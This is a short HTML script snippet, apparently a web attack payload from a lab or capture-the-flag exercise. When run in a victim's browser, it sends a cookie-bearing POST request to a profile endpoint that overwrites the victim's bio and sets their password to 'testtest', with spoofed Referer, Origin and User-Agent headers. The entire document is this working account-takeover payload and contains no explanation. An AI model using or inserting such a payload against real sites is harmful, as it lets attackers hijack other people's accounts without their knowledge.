<script>
fetch("https://localhost/profile", {
  method: "POST",
  credentials: "include", // Important to send cookies
  headers: {
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Referer": "https://3.248.188.232/profile",
    "Origin": "*",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br"
    // Note: You can't manually set 'Cookie' or certain other headers in browser JS due to security restrictions
  },
  body: JSON.stringify({
    bio: "Hello from Bob!",
    password: "testtest"
  })
})
.then(response => response.json())
.then(data => console.log("Response:", data))
.catch(error => console.error("Error:", error));
</script>
